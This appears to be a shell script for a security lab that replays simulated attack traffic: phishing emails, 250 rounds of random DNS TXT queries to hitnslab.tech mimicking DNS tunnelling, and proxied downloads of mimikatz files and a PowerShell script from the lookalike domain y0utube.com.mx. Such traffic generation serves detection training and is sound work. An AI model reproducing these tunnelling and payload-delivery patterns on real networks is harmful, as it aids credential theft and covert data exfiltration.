#!/bin/sh

cd `dirname $0`

ENDPOINT_IP=192.168.208.44
PROXY_ADDR=192.168.208.4:8080
SQUID_LOG_TCP=192.168.208.46:15141
DNS_IP=192.168.208.3

for i in `ls -1 *.eml 2> /dev/null`; do
  python3 ../../bin/play-smtp.py --client.ip "183.79.209.80" --server.ip "172.16.1.33" "$i"
done

sleep 30

for i in `seq 1 1 250`; do
  DNS_Q=`head -c 120 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | cut -c 1-120`
  DNS_R=`head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | cut -c 1-32`
  
  python3 ../../bin/play-dns.py \
   --client.ip "${ENDPOINT_IP}" --server.ip "${DNS_IP}" \
   --dns.type txt --dns.r "${DNS_Q}" "${DNS_R}.hitnslab.tech"
  python3 ../../bin/play-dns.py \
   --client.ip "${DNS_IP}" --server.ip "8.8.8.8" \
   --dns.type txt --dns.r "${DNS_Q}" "${DNS_R}.hitnslab.tech"
  sleep 1
done

for file in mimidrv.sys mimilib.dll mimikatz.exe xp101t.ps1; do
  python3 ../../bin/play-http.py \
   --type inside-and-outside-proxy \
   --client.ip "${ENDPOINT_IP}" --server.ip "74.220.16.1" \
   --proxy.addr "${PROXY_ADDR}" \
   --request.url "http://y0utube.com.mx/${file}" \
   --response.content_type "application/octet-stream" \
   --response.body.type file \
   --response.body "${file}" \
   --squid.log.tcp.host "${SQUID_LOG_TCP}" \
   --repository repository.zip
done

for i in `seq 1 1 250`; do
  DNS_Q=`head -c 120 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | cut -c 1-120`
  DNS_R=`head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | cut -c 1-32`
  
  python3 ../../bin/play-dns.py \
   --client.ip "${ENDPOINT_IP}" --server.ip "${DNS_IP}" \
   --dns.type txt --dns.r "${DNS_Q}" "${DNS_R}.hitnslab.tech"
  python3 ../../bin/play-dns.py \
   --client.ip "${DNS_IP}" --server.ip "8.8.8.8" \
   --dns.type txt --dns.r "${DNS_Q}" "${DNS_R}.hitnslab.tech"
  sleep 1
done
